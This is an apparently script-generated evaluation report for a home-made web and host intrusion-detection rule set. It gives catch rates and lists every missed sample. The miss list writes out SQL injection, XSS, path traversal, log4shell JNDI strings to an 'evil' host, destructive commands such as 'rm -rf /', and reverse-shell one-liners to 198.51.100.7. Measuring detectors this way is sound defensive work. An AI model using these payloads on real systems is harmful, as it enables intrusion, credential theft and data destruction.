# Round 2 held-out evaluation (offline)

Made by `python3 eval/heldout_round2.py` on 2026-11-22. Rules were NOT changed for this run.

Samples 'round2' were written by the author of the rules after the rules were frozen: bigger than the first held-out set, but **not independent**. Rows 'teammate' (if any) come from eval/samples_teammate/ and are the independent estimate. For BENIGN rows lower is better. Small hand-written sets, no network traffic: read as 'what the rules catch and miss', not as a claim about the internet.

| Set | Area | Class | Samples | Caught / wrong | Note |
|---|---|---|---|---|---|
| round2 | web | SQL injection | 50 | 32 (64%) | 28 would block on that single request |
| round2 | web | XSS | 50 | 46 (92%) | 0 would block on that single request |
| round2 | web | Path traversal | 50 | 39 (78%) | 39 would block on that single request |
| round2 | web | Command injection / log4shell | 51 | 29 (57%) | 29 would block on that single request |
| round2 | web | BENIGN requests | 81 | 0 | 0 would BLOCK a visitor on one request (must be 0) |
| round2 | web | BENIGN 404/403 and admin-login pages | 5 | 0 | scored 10+ points (must be 0) |
| round2 | host | Reverse shells (with a remote connection) | 26 | 22 (85%) | killed |
| round2 | host | Crypto miners | 16 | 14 (88%) | killed |
| round2 | host | BENIGN processes | 40 | 0 | wrongly killed (must be 0) |

## Misses and false positives (printed, not hidden)

- round2 web SQL injection not flagged: /a?id=1 ORDER BY 10--
- round2 web SQL injection not flagged: /a?id=1 ORDER BY 3#
- round2 web SQL injection not flagged: /a?id=1; EXEC xp_cmdshell('whoami')--
- round2 web SQL injection not flagged: /a?id=1; EXEC master..xp_cmdshell 'dir'
- round2 web SQL injection not flagged: /a?id=1' AND 1=CAST((SELECT version()) AS INT)--
- round2 web SQL injection not flagged: /a?id=1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)
- round2 web SQL injection not flagged: /a?id=1 OR 2>1
- round2 web SQL injection not flagged: /a?id=1 INTO OUTFILE '/var/www/x.php'
- round2 web SQL injection not flagged: /a?id=1;INSERT INTO users VALUES('a','b')--
- round2 web SQL injection not flagged: /a?id=1;UPDATE users SET admin=1--
- round2 web SQL injection not flagged: /a?id=1;DELETE FROM logs--
- round2 web SQL injection not flagged: /a?id=1;TRUNCATE TABLE sessions
- round2 web SQL injection not flagged: /a?id=1 AND 'x'='x
- round2 web SQL injection not flagged: /a?id=1 HAVING 1=1--
- round2 web SQL injection not flagged: /a?id=1 GROUP BY name HAVING 1=1
- round2 web SQL injection not flagged: /a?id=1 PROCEDURE ANALYSE()
- round2 web SQL injection not flagged: /a?id=1 RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))
- round2 web SQL injection not flagged: /a?id=1 AND LENGTH(database())>0
- round2 web XSS not flagged: /c?m=<marquee onstart=alert(1)>
- round2 web XSS not flagged: /c?m=<details open ontoggle=alert(1)>
- round2 web XSS not flagged: /c?m=<xss onafterscriptexecute=alert(1)>
- round2 web XSS not flagged: /c?m=<body onpageshow=alert(1)>
- round2 web Path traversal not flagged: /f?p=/etc/hosts
- round2 web Path traversal not flagged: /f?p=/etc/group
- round2 web Path traversal not flagged: /f?p=/etc/issue
- round2 web Path traversal not flagged: /f?p=/proc/version
- round2 web Path traversal not flagged: /f?p=/var/log/auth.log
- round2 web Path traversal not flagged: /f?p=/var/log/apache2/access.log
- round2 web Path traversal not flagged: /f?p=/root/.ssh/id_rsa
- round2 web Path traversal not flagged: /f?p=/home/user/.bash_history
- round2 web Path traversal not flagged: /a?file=php://filter/convert.base64-encode/resource=index.php
- round2 web Path traversal not flagged: /a?file=expect://id
- round2 web Path traversal not flagged: /a?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
- round2 web Command injection / log4shell not flagged: /r?c=a&&id
- round2 web Command injection / log4shell not flagged: /r?c=a||id
- round2 web Command injection / log4shell not flagged: /r?c=a|id
- round2 web Command injection / log4shell not flagged: /r?c=a%0aid
- round2 web Command injection / log4shell not flagged: /r?c=a;python -c 'import os;os.system("id")'
- round2 web Command injection / log4shell not flagged: /r?c=a;php -r 'system("id");'
- round2 web Command injection / log4shell not flagged: /r?c=a;rm -rf /
- round2 web Command injection / log4shell not flagged: /r?c=a;chmod 777 /tmp/x
- round2 web Command injection / log4shell not flagged: /r?c=a;uname -a
- round2 web Command injection / log4shell not flagged: /r?c=a|cmd /c whoami
- round2 web Command injection / log4shell not flagged: /r?c=${${::-j}${::-n}${::-d}${::-i}:ldap://evil/a}
- round2 web Command injection / log4shell not flagged: /r?c=${j${::-n}di:ldap://evil/a}
- round2 web Command injection / log4shell not flagged: /r?c=%{(#_='multipart/form-data').(#cmd='id')}
- round2 web Command injection / log4shell not flagged: /r?c=a;sleep 5
- round2 web Command injection / log4shell not flagged: /r?c=a|sleep 5
- round2 web Command injection / log4shell not flagged: /r?c=a;ping -c 5 127.0.0.1
- round2 web Command injection / log4shell not flagged: /r?c=a&ping -n 5 127.0.0.1
- round2 web Command injection / log4shell not flagged: /r?c=;/usr/bin/id
- round2 web Command injection / log4shell not flagged: /r?c=;/bin/ls -la
- round2 web Command injection / log4shell not flagged: /r?c=a;echo vulnerable
- round2 web Command injection / log4shell not flagged: /r?c=a|echo vulnerable
- round2 web Command injection / log4shell not flagged: /r?c=%7Cid
- round2 host reverse shell not caught: ruby -rsocket -e exit if fork;c=TCPSocket.new('198.51.100.7','4444');while(cmd=c.gets);IO.popen(cmd,
- round2 host reverse shell not caught: lua -e require('socket');t=socket.tcp();t:connect('198.51.100.7','4444');os.execute('/bin/sh -i <&3 
- round2 host reverse shell not caught: zsh -c zmodload zsh/net/tcp;ztcp 198.51.100.7 4444;zsh >&$REPLY 2>&$REPLY 0<&$REPLY
- round2 host reverse shell not caught: curl http://198.51.100.7/s.sh | bash
- round2 host miner not caught: ./lolMiner --algo ETHASH --pool x:1
- round2 host miner not caught: ./phoenixminer -pool x:1 -wal w
